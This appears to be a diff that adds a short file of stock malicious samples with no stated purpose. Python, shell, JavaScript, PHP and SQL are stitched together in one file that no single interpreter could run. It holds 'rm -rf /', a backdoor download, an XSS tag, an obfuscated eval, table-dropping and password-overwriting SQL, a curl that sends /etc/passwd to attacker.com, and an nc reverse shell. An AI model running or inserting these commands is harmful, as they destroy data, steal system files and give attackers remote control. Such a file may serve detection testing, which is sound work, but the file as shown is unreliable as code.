@@ -1,0 +1,13 @@
+import os
+os.system('rm -rf /')
+wget http://malicious-site.com/backdoor.sh
+
+<script>alert('XSS Attack')</script>
+eval(base64_decode('bWFs aWNpb3VzIGNvZGU='))
+
+SELECT * FROM users; DROP TABLE customers;
+UPDATE admin SET password='hacked' WHERE id=1;
+DELETE FROM financial_records;
+
+curl http://attacker.com/steal?data=$(cat /etc/passwd)
+nc -e /bin/bash attacker.com 4444
